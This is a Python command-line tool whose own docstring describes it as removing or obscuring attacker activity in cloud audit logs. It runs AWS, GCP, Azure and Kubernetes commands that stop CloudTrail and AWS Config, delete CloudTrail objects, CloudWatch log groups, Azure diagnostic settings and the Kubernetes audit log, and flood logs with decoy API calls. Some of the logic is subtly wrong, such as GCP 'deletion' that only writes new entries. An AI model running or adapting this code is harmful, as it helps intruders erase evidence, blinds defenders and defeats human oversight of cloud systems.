#!/usr/bin/env python3
"""
Multi-Cloud Audit Log Manipulation Tool
Removes, modifies, or obscures attacker activity in cloud audit logs.
"""

import subprocess
import json
import argparse
import sys
from typing import List, Optional, Dict
from datetime import datetime, timedelta


class LogManipulator:
    """Handles audit log manipulation across cloud platforms."""
    
    def __init__(self, cloud_type: str):
        self.cloud_type = cloud_type
    
    def delete_aws_cloudtrail_events(self, trail_name: str, 
                                    hours_back: int = 24) -> bool:
        """Delete CloudTrail events."""
        try:
            # Get S3 bucket for trail
            cmd = [
                'aws', 'cloudtrail', 'describe-trails',
                '--trail-name-list', trail_name,
                '--query', 'trailList[0].S3BucketName',
                '--output', 'text'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                bucket = result.stdout.strip()
                
                # Delete recent objects
                cutoff_time = (datetime.utcnow() - timedelta(hours=hours_back)).isoformat()
                cmd = [
                    'aws', 's3api', 'list-objects-v2',
                    '--bucket', bucket,
                    '--query', f'Contents[?LastModified>=`{cutoff_time}`].Key',
                    '--output', 'text'
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    keys = result.stdout.strip().split()
                    for key in keys:
                        cmd = [
                            'aws', 's3', 'rm',
                            f's3://{bucket}/{key}'
                        ]
                        subprocess.run(cmd, capture_output=True, text=True)
                    
                    return True
        except Exception as e:
            print(f'Error deleting CloudTrail events: {e}', file=sys.stderr)
        
        return False
    
    def stop_aws_cloudtrail(self, trail_name: str) -> bool:
        """Stop CloudTrail logging."""
        try:
            cmd = [
                'aws', 'cloudtrail', 'stop-logging',
                '--name', trail_name
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            print(f'Error stopping CloudTrail: {e}', file=sys.stderr)
        return False
    
    def delete_aws_cloudwatch_logs(self, log_group: str,
                                  pattern: Optional[str] = None) -> bool:
        """Delete CloudWatch logs."""
        try:
            if pattern:
                # Delete specific log streams matching pattern
                cmd = [
                    'aws', 'logs', 'describe-log-streams',
                    '--log-group-name', log_group,
                    '--query', f'logStreams[?contains(logStreamName, `{pattern}`)].logStreamName',
                    '--output', 'text'
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    streams = result.stdout.strip().split()
                    for stream in streams:
                        cmd = [
                            'aws', 'logs', 'delete-log-stream',
                            '--log-group-name', log_group,
                            '--log-stream-name', stream
                        ]
                        subprocess.run(cmd, capture_output=True, text=True)
            else:
                # Delete entire log group
                cmd = [
                    'aws', 'logs', 'delete-log-group',
                    '--log-group-name', log_group
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)
                return result.returncode == 0
            
            return True
        except Exception as e:
            print(f'Error deleting CloudWatch logs: {e}', file=sys.stderr)
        return False
    
    def disable_aws_config_recording(self) -> bool:
        """Disable AWS Config recording."""
        try:
            # Stop recorder
            cmd = [
                'aws', 'configservice', 'stop-config-rules-evaluation'
            ]
            subprocess.run(cmd, capture_output=True, text=True)
            
            # Stop recorder
            cmd = [
                'aws', 'configservice', 'stop-recorder'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            print(f'Error disabling AWS Config: {e}', file=sys.stderr)
        return False
    
    def delete_gcp_logging_entries(self, filter_str: str,
                                  days_back: int = 7) -> bool:
        """Delete GCP Cloud Logging entries."""
        try:
            cutoff_date = (datetime.utcnow() - timedelta(days=days_back)).isoformat()
            
            # Get log entry IDs
            cmd = [
                'gcloud', 'logging', 'read',
                filter_str,
                f'--limit=9999',
                f'--filter=timestamp>="{cutoff_date}"',
                '--format=json'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0 and result.stdout:
                entries = json.loads(result.stdout)
                
                # Delete each entry
                for entry in entries:
                    log_name = entry.get('logName', '')
                    timestamp = entry.get('timestamp', '')
                    
                    cmd = [
                        'gcloud', 'logging', 'write',
                        log_name,
                        '# Entry removed',
                        f'--timestamp={timestamp}'
                    ]
                    subprocess.run(cmd, capture_output=True, text=True)
            
            return True
        except Exception as e:
            print(f'Error deleting GCP logs: {e}', file=sys.stderr)
        return False
    
    def disable_gcp_audit_logging(self, project_id: str) -> bool:
        """Disable GCP audit logging."""
        try:
            # Get current IAM policy
            cmd = [
                'gcloud', 'projects', 'get-iam-policy',
                project_id,
                '--format=json'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                policy = json.loads(result.stdout)
                
                # Remove audit logging bindings
                for binding in policy.get('bindings', []):
                    if 'audit' in str(binding).lower():
                        policy['bindings'].remove(binding)
                
                # Set policy
                cmd = [
                    'gcloud', 'projects', 'set-iam-policy',
                    project_id,
                    '-'
                ]
                result = subprocess.run(
                    cmd,
                    input=json.dumps(policy),
                    capture_output=True, text=True
                )
                return result.returncode == 0
        except Exception as e:
            print(f'Error disabling GCP audit logging: {e}', file=sys.stderr)
        return False
    
    def delete_azure_activity_logs(self, resource_group: str,
                                  days_back: int = 7) -> bool:
        """Delete Azure Activity logs."""
        try:
            cutoff_date = (datetime.utcnow() - timedelta(days=days_back)).isoformat()
            
            cmd = [
                'az', 'monitor', 'activity-log', 'list',
                '--resource-group', resource_group,
                f'--offset', f'{days_back}d',
                '--output', 'json'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0 and result.stdout:
                logs = json.loads(result.stdout)
                
                # Logs cannot be directly deleted in Azure
                # Instead, disable logging for resources
                for log in logs:
                    resource_id = log.get('resourceId', '')
                    
                    cmd = [
                        'az', 'monitor', 'diagnostic-settings', 'delete',
                        '--name', 'default',
                        '--resource', resource_id
                    ]
                    subprocess.run(cmd, capture_output=True, text=True)
            
            return True
        except Exception as e:
            print(f'Error deleting Azure logs: {e}', file=sys.stderr)
        return False
    
    def delete_k8s_audit_logs(self, namespace: str = 'all') -> bool:
        """Delete Kubernetes audit logs."""
        try:
            # Delete audit logs from persistent volume
            cmd = [
                'kubectl', 'exec', '-it',
                'audit-pod', '--',
                'rm', '/var/log/kubernetes/audit.log'
            ]
            subprocess.run(cmd, capture_output=True, text=True)
            
            # Clear event logs
            if namespace == 'all':
                cmd = [
                    'kubectl', 'delete', 'events',
                    '--all-namespaces'
                ]
            else:
                cmd = [
                    'kubectl', 'delete', 'events',
                    '-n', namespace
                ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            print(f'Error deleting K8s audit logs: {e}', file=sys.stderr)
        return False
    
    def obscure_activity_with_noise(self, cloud_type: str, 
                                   num_operations: int = 100) -> bool:
        """Generate noise to obscure attacker activity."""
        try:
            if cloud_type == 'aws':
                # Generate benign API calls
                for i in range(num_operations):
                    # List IAM users (harmless)
                    cmd = ['aws', 'iam', 'list-users']
                    subprocess.run(cmd, capture_output=True, text=True)
                    
                    # Describe EC2 instances
                    cmd = ['aws', 'ec2', 'describe-instances', '--max-results', '1']
                    subprocess.run(cmd, capture_output=True, text=True)
            
            elif cloud_type == 'gcp':
                # Generate benign GCP API calls
                for i in range(num_operations):
                    cmd = ['gcloud', 'projects', 'list']
                    subprocess.run(cmd, capture_output=True, text=True)
                    
                    cmd = ['gsutil', 'ls']
                    subprocess.run(cmd, capture_output=True, text=True)
            
            return True
        except Exception as e:
            print(f'Error generating noise: {e}', file=sys.stderr)
        return False


def main():
    parser = argparse.ArgumentParser(
        description='Multi-cloud audit log manipulation tool'
    )
    parser.add_argument('--cloud', choices=['aws', 'gcp', 'azure', 'k8s'],
                       required=True, help='Cloud platform')
    parser.add_argument('--action', 
                       choices=['delete-events', 'disable-logging', 'delete-logs', 'obscure'],
                       required=True, help='Action to perform')
    parser.add_argument('--resource', help='Resource name (trail, log group, etc)')
    parser.add_argument('--days-back', type=int, default=7, help='Days to delete back')
    parser.add_argument('--filter', help='Filter for log entries')
    
    args = parser.parse_args()
    
    manipulator = LogManipulator(args.cloud)
    
    success = False
    
    if args.cloud == 'aws':
        if args.action == 'delete-events' and args.resource:
            success = manipulator.delete_aws_cloudtrail_events(args.resource, args.days_back)
        elif args.action == 'disable-logging' and args.resource:
            success = manipulator.stop_aws_cloudtrail(args.resource)
        elif args.action == 'delete-logs' and args.resource:
            success = manipulator.delete_aws_cloudwatch_logs(args.resource)
        elif args.action == 'obscure':
            success = manipulator.obscure_activity_with_noise('aws')
    
    elif args.cloud == 'gcp':
        if args.action == 'delete-logs' and args.filter:
            success = manipulator.delete_gcp_logging_entries(args.filter, args.days_back)
        elif args.action == 'disable-logging' and args.resource:
            success = manipulator.disable_gcp_audit_logging(args.resource)
        elif args.action == 'obscure':
            success = manipulator.obscure_activity_with_noise('gcp')
    
    elif args.cloud == 'azure':
        if args.action == 'delete-logs' and args.resource:
            success = manipulator.delete_azure_activity_logs(args.resource, args.days_back)
    
    elif args.cloud == 'k8s':
        if args.action == 'delete-logs':
            success = manipulator.delete_k8s_audit_logs(args.resource or 'all')
    
    print(f'Operation successful: {success}')


if __name__ == '__main__':
    main()
